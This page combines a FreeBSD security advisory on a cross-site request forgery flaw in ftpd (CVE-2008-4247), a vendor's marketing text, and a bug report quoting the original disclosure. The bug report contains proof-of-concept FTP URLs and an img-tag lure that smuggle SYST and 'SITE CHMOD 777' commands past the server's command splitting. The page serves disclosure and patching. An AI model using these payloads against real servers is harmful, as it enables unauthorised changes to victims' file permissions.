FreeBSD-SA-08:12.ftpd Security Advisory
The FreeBSD Project
Topic: Cross-site request forgery in ftpd(8)
Category: core
Module: ftpd
Announced: 2008-12-23
Credits: Maksymilian Arciemowicz
Affects: All supported versions of FreeBSD.
Corrected: 2008-12-23 01:23:09 UTC (RELENG\_7, 7.1-PRERELEASE)
2008-12-23 01:23:09 UTC (RELENG\_7\_1, 7.1-RC2)
2008-12-23 01:23:09 UTC (RELENG\_7\_0, 7.0-RELEASE-p7)
2008-12-23 01:23:09 UTC (RELENG\_6, 6.4-STABLE)
2008-12-23 01:23:09 UTC (RELENG\_6\_4, 6.4-RELEASE-p1)
2008-12-23 01:23:09 UTC (RELENG\_6\_3, 6.3-RELEASE-p7)
CVE Name: CVE-2008-4247
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
ftpd(8) is a general-purpose implementation of File Transfer Protocol (FTP)
server that is shipped with the FreeBSD base system. It is not enabled
in default installations but can be enabled as either an inetd(8) server,
or a standard-alone server.
A cross-site request forgery attack is a type of malicious exploit that is
mainly targeted to a web browser, by tricking a user trusted by the site
into visiting a specially crafted URL, which in turn executes a command
which performs some privileged operations on behalf of the trusted user
on the victim site.
II. Problem Description
The ftpd(8) server splits long commands into several requests. This
may result in the server executing a command which is hidden inside
another very long command.
III. Impact
This could, with a specifically crafted command, be used in a
cross-site request forgery attack.
FreeBSD systems running ftpd(8) server could act as a point of privilege
escalation in an attack against users using web browser to access trusted
FTP sites.
IV. Workaround
No workaround is available, but systems not running FTP servers are
not vulnerable. Systems not running the FreeBSD ftp(8) server are not
affected, but users of other ftp daemons are advised to take care
since several other ftp daemons are known to have related bugs.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to 6-STABLE, or 7-STABLE, or to the
RELENG\_7\_1, RELENG\_7\_0, RELENG\_6\_4, or RELENG\_6\_3 security branch
dated after the correction date.
2) To patch your present system:
The following patches have been verified to apply to FreeBSD 6.3, 6.4,
7.0, and 7.1 systems.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch http://security.FreeBSD.org/patches/SA-08:12/ftpd.patch
# fetch http://security.FreeBSD.org/patches/SA-08:12/ftpd.patch.asc
b) Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
# cd /usr/src/libexec/ftpd
# make obj && make depend && make && make install
VI. Correction details
The following list contains the revision numbers of each file that was
corrected in FreeBSD.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| [Description](show_bug.cgi?id=3115#c0)  TJ Saunders    2008-09-20 16:10:27 UTC  ``` Maksymilian Arciemowicz of securityreason.com reported the following:  ftpd -- Internet File Transfer Protocol server  The ftpd utility is the Internet File Transfer Protocol server process. The server uses the TCP protocol and listens at the port specified with the -P option or in the ``ftp'' service specification; see services(5).  Cross-site request forgery, also known as one click attack, sidejacking or session riding and abbreviated as CSRF (Sea-Surf[1]) or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user the website trusts. Contrary to cross-site scripting (XSS), which exploits the trust a user has for a particular site, cross-site request forgery exploits the trust that a site has for a particular user.  <http://en.wikipedia.org/wiki/Cross-site_request_forgery>  --- 1. ftpd *BSD - Cross-site request forgery --- The main problem exists in spliting long command for few others. The problem stems from the fact the use of the loop while() and function fgets().  Example: Command "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  will be split for  500 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA': command not understood. 500'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  When we try call to ftp daemon via browsers and path is longer 512<, our URL will be split.  /* FreeBSD 7.0 */ ftp://cxib@127.0.0.1////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// /////////////////////////////////////syst  return result from SYST command: 215 UNIX Type: L8 Version: BSD-199506  /* NetBSD 4.0 */ ftp://ftp.netbsd.org////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// /////////////////////////////////////SYST  return result from SYST command: 215 UNIX Type: L8 Version: NetBSD-ftpd 20080609  The situation, can be dangerous, when this bug can be exploited like any CSRF attack. Because we can use SITE CHMOD command to change file permission. Only we need some exploit and luck, that admin will executed it.  How to exploit it?  0. Creating some html file with <img> tags <img src="ftp://.....////SITE%20CHMOD%20777%20FILENAME"> ..  1. Give preparing URL for admin.  Example: ftp://ftp.netbsd.org////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// /////////////////////////////////////SITE%20CHMOD%20777%20EXAMPLEFILE  will change permission to EXAMPLEFILE when the owner will use this URL.  I think, it should be some byte, what inform about overflow (empty command should nulling this byte). We have diagnosed this issue on BSD systems. Unfortunately, we do not know exactly how many machines can be infected.  --- 2. How to fix --- OpenBSD has been first informed. Fix is avalible on cvs:  <http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/ftpd.c> <http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/extern.h> <http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/ftpcmd.y>  Thanks for OpenBSD teams. ```  [Comment 1](show_bug.cgi?id=3115#c1)  TJ Saunders    2008-09-20 16:13:52 UTC  ``` Created [attachment 2871](attachment.cgi?id=2871 "Fixes bug") [[details]](attachment.cgi?id=2871&action=edit "Fixes bug") Fixes bug ```  [Comment 2](show_bug.cgi?id=3115#c2)  TJ Saunders    2008-09-20 16:20:38 UTC  ``` Patch committed to CVS.  The patch also covers the case where the admin might configure a PR_TUNABLE_BUFFER_SIZE which is smaller than the default command buffer size (i.e. the buffer size which is used by default if the CommandBufferSize configuration directive is not configured). ```  [Comment 3](show_bug.cgi?id=3115#c3)  TJ Saunders    2008-11-21 00:56:49 UTC  ``` Resolved in 1.3.2rc3. ```  [Comment 4](show_bug.cgi?id=3115#c4)  ???
